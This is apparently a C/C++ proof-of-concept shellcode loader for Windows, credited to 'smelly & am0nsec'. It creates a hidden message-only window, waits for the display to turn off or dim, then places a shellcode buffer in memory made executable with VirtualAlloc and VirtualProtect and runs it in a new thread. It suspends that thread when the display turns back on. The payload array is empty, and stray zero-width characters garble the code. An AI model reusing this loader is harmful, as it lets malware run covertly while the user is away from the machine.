#pragma once
#include <Windows.h>

// Global variables
PPOWERBROADCAST_SETTING pPowerSettings;
HPOWERNOTIFY hPowerNorification;
HINSTANCE hGlobalInstance;
WCHAR lpAtomClassName[36];
ATOM AtomClass;DWORD dwError;
DWORD dwHostThreadId;
HANDLE hHostThread;

LRESULT CALLBACK ​WindowProc​(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
ATOM ​Win64RegisterCallBackNotifications​(VOID);
VOID ​Cleanup​(VOID);

int​​ wWinMain​(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, ​int​ nShowCmd) {
    //smelly & am0nsec
    lpAtomClassName[0]  = ​'s'​; lpAtomClassName[1]  = ​'m'​; lpAtomClassName[2]  = ​'e'​;
    lpAtomClassName[3]  = ​'l'​; lpAtomClassName[4]  = ​'l'​; lpAtomClassName[5]  = ​'y'​;
    lpAtomClassName[6]  = ​' '​; lpAtomClassName[7]  = ​'&'​; lpAtomClassName[8]  = ​' '​;
    lpAtomClassName[9]  = ​'a'​; lpAtomClassName[10] = ​'m'​; lpAtomClassName[11] = ​'0'​;
    lpAtomClassName[12] = ​'n'​; lpAtomClassName[13] = ​'s'​; lpAtomClassName[14] = ​'e'​; 
    lpAtomClassName[15] = ​'c'​; lpAtomClassName[16] = ​'\0'​;
    
    hGlobalInstance = hInstance;
    AtomClass = Win64RegisterCallBackNotifications();
    ​if​ (AtomClass == 0x0) {
        dwError = ::GetLastError();
        Cleanup();
        ​return​ dwError;
    }
    
    HWND hWindow = ::CreateWindowEx(0, lpAtomClassName, ​NULL​, 0, 0, 0, 0, 0, HWND_MESSAGE,​NULL​, hInstance, ​NULL​);
    ​if​ (hWindow == ​NULL​) {
        dwError = ::GetLastError();
        Cleanup();
        ​return​ dwError;
    }
        
    INT nReturn;
    MSG Message;​
    while​ ((nReturn = ::GetMessage(&Message, ​NULL​, 0, 0)) != 0) {
        ::TranslateMessage(&Message);
        ::DispatchMessage(&Message);
    }​
    
    if​ (hWindow)
        ::CloseWindow(hWindow);
    Cleanup();
    ​return​ 0;
}

ATOM ​Win64RegisterCallBackNotifications​(VOID) {​
    // Window class information 
    WNDCLASSEX Wnd = {};

    Wnd.cbSize = ​sizeof​(WNDCLASSEX);
    Wnd.style = 0;
    Wnd.lpfnWndProc = (WNDPROC)WindowProc;
    Wnd.cbClsExtra = 0;
    Wnd.cbWndExtra = 0;
    Wnd.hInstance = hGlobalInstance;
    Wnd.hIcon = ​NULL​;
    Wnd.hCursor = ​NULL​;
    Wnd.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    Wnd.lpszMenuName = ​NULL​;
    Wnd.lpszClassName = lpAtomClassName;
    Wnd.hIconSm = ​NULL​;​
    
    return​ ::RegisterClassEx(&Wnd);
}

LRESULT CALLBACK ​WindowProc​(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ​switch​ (uMsg) {
        ​case​ WM_CREATE: { 
            hPowerNorification = ::RegisterPowerSettingNotification(hwnd, &GUID_CONSOLE_DISPLAY_STATE, DEVICE_NOTIFY_WINDOW_HANDLE);
            ​if​ (hPowerNorification == ​NULL​) { 
                ::SendMessage(hwnd, WM_CLOSE, (WPARAM)0, (LPARAM)0);
                break​;
            }
            
            ::SetThreadExecutionState(ES_AWAYMODE_REQUIRED | ES_CONTINUOUS | ES_SYSTEM_REQUIRED);​
            break​;
        }​
        
        case​ WM_CLOSE: {
            Cleanup();
            ::UnregisterPowerSettingNotification(hPowerNorification);
            ::ExitProcess(0x01);​
        }
        
        case​ WM_POWERBROADCAST: {
            pPowerSettings = (PPOWERBROADCAST_SETTING)lParam;​
            if​ (pPowerSettings->PowerSetting == GUID_CONSOLE_DISPLAY_STATE) {​
                if​ (pPowerSettings->Data[0] == 0x02 || pPowerSettings->Data[0] == 0x00) {​
                    // Check if display off or dimmed
                    if​ (hHostThread == ​NULL​) {
                        ​char​ shellcode[] = ​""​;

                        LPVOID lpAddress = ::VirtualAlloc(​NULL​, ​sizeof​(shellcode),MEM_COMMIT, PAGE_READWRITE);
                        ::RtlMoveMemory(lpAddress, shellcode, ​sizeof​(shellcode));
                        
                        DWORD dwOldProtect;
                        ::VirtualProtect(lpAddress, ​sizeof​(shellcode),PAGE_EXECUTE_READ, &dwOldProtect);
                        
                        hHostThread = ::CreateThread(​NULL​, 0,(LPTHREAD_START_ROUTINE)lpAddress, ​NULL​, 0, &dwHostThreadId);
                        ::WaitForSingleObject(hHostThread, 2000);
                        
                        ​if​ (hHostThread == ​NULL​) {
                            ::SendMessage(hwnd, WM_CLOSE, (WPARAM)0, (LPARAM)0);
                            ​break​;
                        }
                    } ​else​ {
                        ::ResumeThread(hHostThread);
                    }
                } ​else​​if​ (pPowerSettings->Data[0] == 0x01) {​
                    // Display back on
                    ​if​ (hHostThread != ​NULL​)
                    ::SuspendThread(hHostThread);
                }
            }
            ​break​;​
        }
        
        default​: {
            ​return​ ::DefWindowProc(hwnd, uMsg, wParam, lParam);
        }
    }
    
    ​return​ 0;  
}

VOID ​Cleanup​(VOID) {​
    if​ (AtomClass != 0x0) {
        ::UnregisterClass(lpAtomClassName, hGlobalInstance);
    }
}
